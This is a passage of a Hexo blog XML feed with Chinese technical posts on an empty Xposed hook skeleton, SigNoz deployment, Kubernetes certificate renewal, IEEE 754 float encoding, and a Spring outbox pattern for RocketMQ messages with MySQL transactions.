class="line">&lt;/application&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="编写类"><a href="#编写类" class="headerlink" title="编写类"></a>编写类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package com.example.xx;</span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">public class Xxx implements IXposedHookLoadPackage &#123;</span><br><span class="line">	</span><br><span class="line">	@Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line">        Log.i(TAG, lpparam.packageName);</span><br><span class="line">        if (lpparam.packageName.startsWith(&quot;com.tencent.mm&quot;)) &#123;</span><br><span class="line">            hook(lpparam.classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	private void hook(final ClassLoader appClassLoader) &#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="编写xposed-init"><a href="#编写xposed-init" class="headerlink" title="编写xposed_init"></a>编写xposed_init</h1><p>在main文件夹下创建assets文件夹<br>创建xposed_init<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.example.xx.Xxx</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> android </tag>
            
            <tag> xposed </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[搭建可观测平台SigNoz]]></title>
      <url>/2023/signoz-1/</url>
      <content type="html"><![CDATA[<h1 id="搭建可观测平台SigNoz"><a href="#搭建可观测平台SigNoz" class="headerlink" title="搭建可观测平台SigNoz"></a>搭建可观测平台SigNoz</h1><a id="more"></a>
<h1 id="一、前提条件"><a href="#一、前提条件" class="headerlink" title="一、前提条件"></a>一、前提条件</h1><p>git，docker，docker-compose</p>
<h1 id="二、下载安装脚本"><a href="#二、下载安装脚本" class="headerlink" title="二、下载安装脚本"></a>二、下载安装脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b main https://github.com/SigNoz/signoz.git &amp;&amp; cd signoz/deploy/</span><br></pre></td></tr></table></figure>
<h1 id="三、去掉示例程序"><a href="#三、去掉示例程序" class="headerlink" title="三、去掉示例程序"></a>三、去掉示例程序</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">vim docker/clickhouse-setup/docker-compose.yaml</span><br><span class="line"># 注释一下内容</span><br><span class="line">#  hotrod:</span><br><span class="line">#    image: jaegertracing/example-hotrod:1.30</span><br><span class="line">#    container_name: hotrod</span><br><span class="line">#    logging:</span><br><span class="line">#      options:</span><br><span class="line">#        max-size: 50m</span><br><span class="line">#        max-file: &quot;3&quot;</span><br><span class="line">#    command: [&quot;all&quot;]</span><br><span class="line">#    environment:</span><br><span class="line">#      - JAEGER_ENDPOINT=http://otel-collector:14268/api/traces</span><br><span class="line">#</span><br><span class="line">#  load-hotrod:</span><br><span class="line">#    image: &quot;grubykarol/locust:1.2.3-python3.9-alpine3.12&quot;</span><br><span class="line">#    container_name: load-hotrod</span><br><span class="line">#    hostname: load-hotrod</span><br><span class="line">#    environment:</span><br><span class="line">#      ATTACKED_HOST: http://hotrod:8080</span><br><span class="line">#      LOCUST_MODE: standalone</span><br><span class="line">#      NO_PROXY: standalone</span><br><span class="line">#      TASK_DELAY_FROM: 5</span><br><span class="line">#      TASK_DELAY_TO: 30</span><br><span class="line">#      QUIET_MODE: &quot;$&#123;QUIET_MODE:-false&#125;&quot;</span><br><span class="line">#      LOCUST_OPTS: &quot;--headless -u 10 -r 1&quot;</span><br><span class="line">#    volumes:</span><br><span class="line">#      - ../common/locust-scripts:/locust</span><br></pre></td></tr></table></figure>
<h1 id="四、启动"><a href="#四、启动" class="headerlink" title="四、启动"></a>四、启动</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f docker/clickhouse-setup/docker-compose.yaml up -d</span><br></pre></td></tr></table></figure>
<h1 id="五、Java程序接入"><a href="#五、Java程序接入" class="headerlink" title="五、Java程序接入"></a>五、Java程序接入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/open-telemetry/opentelemetry-java-instrumentation/releases/latest/download/opentelemetry-javaagent.jar</span><br><span class="line"># 添加环境变量</span><br><span class="line">OTEL_EXPORTER_OTLP_ENDPOINT=&quot;http://&lt;IP of SigNoz Backend&gt;:4317&quot; OTEL_RESOURCE_ATTRIBUTES=service.name=&lt;app_name&gt;</span><br><span class="line">java -javaagent:/path/to/opentelemetry-javaagent.jar -jar  &lt;myapp&gt;.jar</span><br></pre></td></tr></table></figure>
<h1 id="六、查看"><a href="#六、查看" class="headerlink" title="六、查看"></a>六、查看</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10:3301</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> signoz </tag>
            
            <tag> 可观测平台 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kubenetes更新证书]]></title>
      <url>/2023/k8s-update-cert-1/</url>
      <content type="html"><![CDATA[<h1 id="Kubenetes更新证书"><a href="#Kubenetes更新证书" class="headerlink" title="Kubenetes更新证书"></a>Kubenetes更新证书</h1><a id="more"></a>
<h1 id="一、查看证书过期的时间"><a href="#一、查看证书过期的时间" class="headerlink" title="一、查看证书过期的时间"></a>一、查看证书过期的时间</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># kubeadm certs check-expiration</span><br></pre></td></tr></table></figure>
<h1 id="二、证书备份"><a href="#二、证书备份" class="headerlink" title="二、证书备份"></a>二、证书备份</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cp -rp /etc/kubernetes/ /etc/kubernetes/kubernetes.20230320</span><br></pre></td></tr></table></figure>
<h1 id="三、重新生成证书"><a href="#三、重新生成证书" class="headerlink" title="三、重新生成证书"></a>三、重新生成证书</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># kubeadm certs renew all</span><br></pre></td></tr></table></figure>
<h1 id="四、重新生成配置文件"><a href="#四、重新生成配置文件" class="headerlink" title="四、重新生成配置文件"></a>四、重新生成配置文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /etc/kubernetes/conf.20230320</span><br><span class="line"># mv /etc/kubernetes/*.conf /etc/kubernetes/conf.20230320</span><br><span class="line"># kubeadm init phase kubeconfig all</span><br></pre></td></tr></table></figure>
<h1 id="五、重启kubelet和更新配置"><a href="#五、重启kubelet和更新配置" class="headerlink" title="五、重启kubelet和更新配置"></a>五、重启kubelet和更新配置</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl restart kubelet</span><br><span class="line"># cp /etc/kubernetes/admin.conf ~/.kube/config</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> kubernetes </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入理解计算机浮点数存储]]></title>
      <url>/2022/cs-float-store-1/</url>
      <content type="html"><![CDATA[<p>深入理解计算机浮点数存储</p>
<p>根据IEEE 754 浮点标准<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">V = (-1)^s * M * 2^E</span><br><span class="line"></span><br><span class="line">s: 符号 s决定这数是负数(s=1)还是正数(s=0)</span><br><span class="line">M: 尾数 M是一个二进制小数</span><br><span class="line">E: 阶码 E的作用是对浮点数加权，这个权重是2的E次幂</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">单精度表示</span><br><span class="line">+---------+----------------+------------------------+</span><br><span class="line">|   s     |        E       |           M            |</span><br><span class="line">+---------+----------------+------------------------+</span><br><span class="line">    1             8                   23</span><br><span class="line"></span><br><span class="line">双精度</span><br><span class="line">+---------+----------------+------------------------+</span><br><span class="line">|   s     |        E       |           M            |</span><br><span class="line">+---------+----------------+------------------------+</span><br><span class="line">    1             11                  52</span><br></pre></td></tr></table></figure>
<p>根据十进制数计算二进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">4.25 单精度二进制如何表示</span><br><span class="line">表示方法: 整数部分二进制.小数部分二进制</span><br><span class="line">整数部分二进制如何计算：</span><br><span class="line">整数部分除以2取模得到二进制数，得到的整数部分继续除以2取模，直到除以2等于0结束，取模所得整数位继续向左添加。</span><br><span class="line">12</span><br><span class="line">=&gt; 12 / 2 = 6, 12 % 2 = 0</span><br><span class="line">=&gt; 6 / 2 = 3, 6 % 2 = 0</span><br><span class="line">=&gt; 3 / 2 = 1, 3 % 2 = 1</span><br><span class="line">=&gt; 1 / 2 = 0, 1 % 2 = 1</span><br><span class="line">=&gt; 1100</span><br><span class="line"></span><br><span class="line">小数部分二进制如何计算：</span><br><span class="line">将十进制的小数部分乘2，将所得结果的整数位作为二进制的位。舍弃乘2所得结果的整数部分，如果剩余部分为0，计算结束。否则继续乘2，进行取整操作（所得整数位继续向右添加）</span><br><span class="line">0.25</span><br><span class="line">=&gt; 0.25 * 2 = 0.5</span><br><span class="line">=&gt; 0.5 * 2 = 1.0</span><br><span class="line">=&gt; 0.01</span><br><span class="line"></span><br><span class="line">=&gt; 0100.01</span><br><span class="line">=&gt; 1.0001 * 2^2</span><br><span class="line">=&gt; s = 0, E = 2 + 127, M=000100000000000000000000 (隐藏了整数部分1.)</span><br><span class="line">=&gt; E = 129 =&gt; 10000001</span><br><span class="line">完整表示：</span><br><span class="line">0 10000001 000100000000000000000000</span><br></pre></td></tr></table></figure></p>
<p>根据二进制计算十进制数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0 10000001 000100000000000000000000</span><br><span class="line"></span><br><span class="line">10000001</span><br><span class="line">=&gt; 1 * 2^7 + 0 * 2^6 + 0 * 2^5 + 0 * 2^4 + 0 * 2^3 + 0 * 2^2 + 0 * 2^1 + 1 * 2^0</span><br><span class="line">=&gt; 128 + 0 + 0 + 0 + 0 + 0 + 0 + 1</span><br><span class="line">=&gt; 129</span><br><span class="line"></span><br><span class="line">000100000000000000000000</span><br><span class="line">=&gt; 0 * 2^-1 + 0 * 2^-2 + 0 * 2^-3 + 1 * 2^-4</span><br><span class="line">=&gt;  0.0625</span><br><span class="line"></span><br><span class="line">=&gt; -1^0 * (1 + 0.0625) * 2^(129 - 127)</span><br><span class="line">=&gt; 1 * 1.0625 * 4</span><br><span class="line">=&gt; 4.25</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> c </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> c </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring解决RocketMQ发消息与MySQL事务一致性]]></title>
      <url>/2022/spring-rocketmq-mysql-transaction-1/</url>
      <content type="html"><![CDATA[<p>Spring解决RocketMQ发消息与MySQL事务一致性</p>
<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><ol>
<li>用户订单并支付</li>
<li>发送消息开通查看文章权限<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 伪代码</span><br><span class="line">@Transactional(rollbackFor=Exception.class)</span><br><span class="line">public void pay(long uid, String orderNO) &#123;</span><br><span class="line">  Order order = orderService.selectOrder(uid, orderNO)</span><br><span class="line">  if (order != null) &#123;</span><br><span class="line">    String status = &quot;paid&quot;;</span><br><span class="line">    orderDao.updateStatus(uid, orderNo, status);</span><br><span class="line">    </span><br><span class="line">    rocketMQTemplate.send(&quot;order:status&quot;, message(uid, orderNo, order.itemId, status));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class OrderStatusArticleListener implements RocketMQListener &#123;</span><br><span class="line">    public void onMessage(message) &#123;</span><br><span class="line">        Order order = orderService.selectOrder(message.uid, message.orderNo)</span><br><span class="line">        if (order == null) &#123;</span><br><span class="line">           throw new RuntimeException(&quot;order not found. &quot; + message.orderNo)</span><br><span class="line">        &#125;</span><br><span class="line">        if (order.status != &quot;paid&quot;) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;order not paid. &quot; + message.orderNo)</span><br><span class="line">        &#125;</span><br><span class="line">        // 授权</span><br><span class="line">        articleService.authorize(message.uid, message.itemId)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>上面的例子中会出现消费者查询订单的时候是未支付的状态。</p>
<p>为什么会这样呢？</p>
<p>这是因为我们在spring的事务中同步发送消息导致事务还没有提交。消息已经到了消费者端开始消费了。</p>
<p>解决：</p>
<ol>
<li>增加消息表，与事务同步落库，标记为待处理</li>
<li>MQ 发送成功</li>
<li>MQ 的回调处理落库的数据，标记为处理完成</li>
</ol>
<p>由于是在Spring的环境中，我们使用Spring的TransactionSynchronizationManager#registerSynchronization</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (TransactionSynchronizationManager.isSynchronizationActive()) &#123;</span><br><span class="line">    TransactionSynchronizationManager.registerSynchronization(new MQTransactionSynchronization(</span><br><span class="line">            rocketMQTemplate, destination, message, timeout, delayLevel</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们自定义一个TransactionSynchronization名字叫MQTransactionSynchronization<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">@Slf4j</span><br><span class="line">public class MQTransactionSynchronization implements TransactionSynchronization &#123;</span><br><span class="line">    private DataSource dataSource;</span><br><span class="line">    private ConnectionHolder connectionHolder;</span><br><span class="line">    private String id;</span><br><span class="line">    private RocketMQTemplate rocketMQTemplate;</span><br><span class="line">    private String destination;</span><br><span class="line">    private Message message;</span><br><span class="line">    private long timeout;</span><br><span class="line">    private int delayLevel;</span><br><span class="line">    </span><br><span class="line">    public MQTransactionSynchronization(RocketMQTemplate  rocketMQTemplate, String destination, Message  message, long  timeout, int delayLevel) &#123;</span><br><span class="line">        this.rocketMQTemplate = rocketMQTemplate;</span><br><span class="line">        this.destination = destination;</span><br><span class="line">        this.message = message;</span><br><span class="line">        this.timeout = timeout;</span><br><span class="line">        this.delayLevel = delayLevel;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @Override</span><br><span class="line">    public void beforeCompletion() &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    @Override</span><br><span class="line">    public void beforeCommit(boolean readOnly) &#123;</span><br><span class="line">        Map&lt;Object, Object&gt; resourceMap = TransactionSynchronizationManager.getResourceMap();</span><br><span class="line">        for (Map.Entry&lt;Object, Object&gt; entry : resourceMap.entrySet()) &#123;</span><br><span class="line">            Object key = entry.getKey();</span><br><span class="line">            Object value = entry.getValue();</span><br><span class="line">            if (value instanceof ConnectionHolder) &#123;</span><br><span class="line">                this.dataSource = (DataSource) key;</span><br><span class="line">                this.connectionHolder = (ConnectionHolder) value;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         if (connectionHolder == null) &#123;</span><br><span class="line">            log.warn(&quot;connectionHolder is null&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">		this.id = UUID.randomUUID().toString();</span><br><span class="line">		final String mqTemplateName = ApplicationContextUtils.findBeanName(rocketMQTemplate.getClass(), rocketMQTemplate);</span><br><span class="line">		MqMsgDao.insertMsg(connectionHolder, id, mqTemplateName, destination, message, timeout, delayLevel);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void afterCommit() &#123;</span><br><span class="line">        log.debug(&quot;afterCommit &#123;&#125;&quot;, TransactionSynchronizationManager.getCurrentTransactionName());</span><br><span class="line">        try &#123;</span><br><span class="line">            rocketMQTemplate.syncSend(destination, message, timeout, delayLevel);</span><br><span class="line">            MqMsgDao.deleteMsgById(dataSource, this.id);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            log.error(&quot;mq send message failed. topic:[&#123;&#125;], message:[&#123;&#125;]&quot;, destination, message, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void afterCompletion(int status) &#123;</span><br><span class="line">        log.debug(&quot;afterCompletion &#123;&#125; : &#123;&#125;&quot;, TransactionSynchronizationManager.getCurrentTransactionName(), status);</span><br><span class="line">        rocketMQTemplate = null;</span><br><span class="line">        destination = null;</span><br><span class="line">        message = null;</span><br><span class="line">        connectionHolder = null;</span><br><span class="line">        dataSource = null;</span><br><span class="line">        id = null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@Slf4j</span><br><span class="line">public class MqMsgDao &#123;</span><br><span class="line">    public static final String STATUS_NEW = &quot;NEW&quot;;</span><br><span class="line">    public static final Integer MAX_RETRY_TIMES = 5;</span><br><span class="line">    private static final JsonMapper MAPPER = JsonMapper.builder()</span><br><span class="line">            .configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false)</span><br><span class="line">            .enable(MapperFeature.PROPAGATE_TRANSIENT_MARKER)</span><br><span class="line">            .build();</span><br><span class="line">    </span><br><span class="line">    public static List&lt;MqMsg&gt; listMsg(DataSource dataSource) &#123;</span><br><span class="line">        Connection conn = null;</span><br><span class="line">        PreparedStatement ps = null;</span><br><span class="line">        ResultSet rs = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            conn = dataSource.getConnection();</span><br><span class="line">            ps = conn.prepareStatement(&quot;select * from tb_mq_msg where status = ? and retry_times &lt; ? limit 100&quot;);</span><br><span class="line">            int i = 0;</span><br><span class="line">            ps.setObject(++i, STATUS_NEW);</span><br><span class="line">            ps.setObject(++i, MAX_RETRY_TIMES);</span><br><span class="line">            rs = ps.executeQuery();</span><br><span class="line">            List&lt;MqMsg&gt; list = new ArrayList&lt;&gt;(100);</span><br><span class="line">            while (rs.next()) &#123;</span><br><span class="line">                MqMsg mqMsg = new MqMsg();</span><br><span class="line">                mqMsg.setId(rs.getString(&quot;id&quot;));</span><br><span class="line">                mqMsg.setStatus(rs.getString(&quot;status&quot;));</span><br><span class="line">                mqMsg.setMqTemplateName(rs.getString(&quot;mq_template_name&quot;));</span><br><span class="line">                mqMsg.setMqDestination(rs.getString(&quot;mq_destination&quot;));</span><br><span class="line">                mqMsg.setMqTimeout(rs.getLong(&quot;mq_timeout&quot;));</span><br><span class="line">                mqMsg.setMqDelayLevel(rs.getInt(&quot;mq_delay_level&quot;));</span><br><span class="line">                Map&lt;String, Object&gt; map = fromJson(rs.getString(&quot;payload&quot;));</span><br><span class="line">                GenericMessage&lt;Object&gt; message = new GenericMessage&lt;&gt;(map.get(&quot;payload&quot;), (Map&lt;String, Object&gt;) map.get(&quot;headers&quot;));</span><br><span class="line">                mqMsg.setMessage(message);</span><br><span class="line">                mqMsg.setRetryTimes(rs.getInt(&quot;retry_times&quot;));</span><br><span class="line">                mqMsg.setCreateTime(rs.getTimestamp(&quot;create_time&quot;));</span><br><span class="line">                mqMsg.setUpdateTime(rs.getTimestamp(&quot;update_time&quot;));</span><br><span class="line">                list.add(mqMsg);</span><br><span class="line">            &#125;</span><br><span class="line">            return list;</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            close(rs, ps, conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void insertMsg(ConnectionHolder connectionHolder,</span><br><span class="line">                                 String id,</span><br><span class="line">                                 String mqTemplateName,</span><br><span class="line">                                 String mqDestination,</span><br><span class="line">                                 Message message,</span><br><span class="line">                                 long mqTimeout,</span><br><span class="line">                                 int mqDelayLevel) &#123;</span><br><span class="line">         Connection connection = connectionHolder.getConnection();</span><br><span class="line">         PreparedStatement ps = null;</span><br><span class="line">         Map&lt;String, Object&gt; payload = new HashMap&lt;&gt;();</span><br><span class="line">         payload.put(&quot;payload&quot;, message.getPayload());</span><br><span class="line">         payload.put(&quot;headers&quot;, message.getHeaders());</span><br><span class="line">        try &#123;</span><br><span class="line">            ps = connection.prepareStatement(&quot;insert into tb_mq_msg values(?,?,?,?,?,?,?,?,?,?)&quot;);</span><br><span class="line">            Date now = new Date();</span><br><span class="line">            int i = 0;</span><br><span class="line">            ps.setObject(++i, id);</span><br><span class="line">            ps.setObject(++i, STATUS_NEW);</span><br><span class="line">            ps.setObject(++i, mqTemplateName);</span><br><span class="line">            ps.setObject(++i, mqDestination);</span><br><span class="line">            ps.setObject(++i, mqTimeout);</span><br><span class="line">            ps.setObject(++i, mqDelayLevel);</span><br><span class="line">            ps.setObject(++i, toJson(payload));</span><br><span class="line">            ps.setObject(++i, 0);</span><br><span class="line">            ps.setObject(++i, 